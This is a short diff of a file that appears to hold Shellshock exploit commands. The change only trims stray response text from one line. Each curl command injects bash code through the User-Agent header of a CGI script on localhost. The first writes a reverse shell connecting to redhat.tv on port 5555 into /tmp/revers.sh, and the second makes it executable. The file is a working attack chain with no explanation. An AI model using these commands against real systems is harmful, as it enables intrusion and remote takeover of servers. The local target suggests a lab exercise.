@@ -1,5 +1,4 @@
-curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; echo 'bash -i >& /dev/tcp/redhat.tv/5555 0>&1' > /tmp/revers.sh" localhost:5566/cgi-bin/app.cgiContent-type: text/html
-
+curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; echo 'bash -i >& /dev/tcp/redhat.tv/5555 0>&1' > /tmp/revers.sh" localhost:5566/cgi-bin/app.cgi
 
 curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; /usr/bin/chmod +x /tmp/revers.sh" localhost:5566/cgi-bin/app.cgi
 
